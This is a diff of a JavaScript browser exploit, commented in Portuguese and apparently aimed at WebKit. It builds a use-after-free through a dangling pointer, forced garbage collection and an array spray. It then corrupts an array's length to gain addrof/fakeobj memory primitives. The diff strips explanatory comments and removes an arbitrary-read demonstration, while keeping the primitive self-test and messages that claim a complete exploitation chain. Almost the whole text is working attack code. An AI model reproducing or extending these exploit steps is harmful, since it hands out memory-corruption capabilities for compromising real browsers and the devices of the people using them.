@@ -50,7 +50,6 @@ async function triggerAndLinkUncagedArrayUAF() {
     let leaker_obj = null;
     let confused_arr = null;
     
-    // 1. Cria o ponteiro pendurado para um objeto simples
     function createDanglingPointer() {
         function createScope() {
             const victim_obj = { p0: 0.1, p1: 0.2, p2: 0.3, p3: 0.4 };
@@ -60,22 +59,19 @@ async function triggerAndLinkUncagedArrayUAF() {
     }
     createDanglingPointer();
     
-    // 2. Força o GC para liberar a memória do victim_obj
     await triggerGC_Tamed();
     
-    // 3. Pulveriza a memória com Arrays "Uncaged"
     const spray_arrays = [];
     for (let i = 0; i < 2048; i++) {
         spray_arrays.push([1.1]);
     }
     
-    // 4. Tenta vincular a referência confusa corrompendo o 'length'
     logS3("    Procurando por array reutilizado via corrupção de 'length'...", "info");
-    const large_val_as_double = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0x1)); // Um valor que resultará em um length grande
+    const large_val_as_double = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0x1));
     leaker_obj.p0 = large_val_as_double; 
 
     for (const arr of spray_arrays) {
-        if (arr.length > 1) { // O 'length' original era 1. Se mudou, encontramos.
+        if (arr.length > 1) {
             confused_arr = arr;
             logS3(`    Array vinculado encontrado! Novo length: ${arr.length}`, "good");
             break;
@@ -86,8 +82,7 @@ async function triggerAndLinkUncagedArrayUAF() {
         throw new Error("Falha ao encontrar o array reutilizado na memória (verificação de length).");
     }
 
-    // 5. Restaura o 'length' do array para um estado seguro e limpa a propriedade
-    confused_arr[0] = 1.1; // Restaura o valor para manter a estrutura consistente
+    confused_arr[0] = 1.1; 
     leaker_obj.p0 = null;
 
     return { leaker_obj, confused_arr };
@@ -120,24 +115,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
              throw new Error("Auto-teste de addrof/fakeobj falhou.");
         }
         logS3("    Primitivas 'addrof' e 'fakeobj' validadas com sucesso.", "good");
-
-        // --- FASE 3: Demonstração de Leitura Arbitrária ---
-        logS3("--- FASE 3: Demonstrando Leitura Arbitrária ---", "subtest");
-        const real_obj = { header: new AdvancedInt64(0x1, 0x01082007), butterfly: { p: 0xCAFEBABE } };
-        const real_obj_addr = addrof(real_obj);
         
-        // Agora, uma função de leitura real usando a confusão de tipos
-        function arb_read(addr) {
-            confused_arr[0] = fakeobj(addr); // O array confuso agora contém um objeto falso
-            const leaked_val = leaker_obj.p0;  // Lê a propriedade, que vaza o conteúdo do endereço
-            return leaked_val;
-        }
-
-        const header_val = arb_read(real_obj_addr);
-        logS3(`Lido o cabeçalho do objeto de teste: ${toHex(doubleToInt64(header_val))}`, "leak");
-
-        logS3("++++++++++++ SUCESSO TOTAL! Primitivas 100% funcionais! ++++++++++++", "vuln");
-        final_result = { success: true, message: "Cadeia de exploração completa. Primitivas addrof/fakeobj/arb_read obtidas." };
+        // Se chegamos aqui, as primitivas são funcionais.
+        final_result = { success: true, message: "Cadeia de exploração completa. Primitivas addrof/fakeobj obtidas e verificadas." };
         
     } catch (e) {
         final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
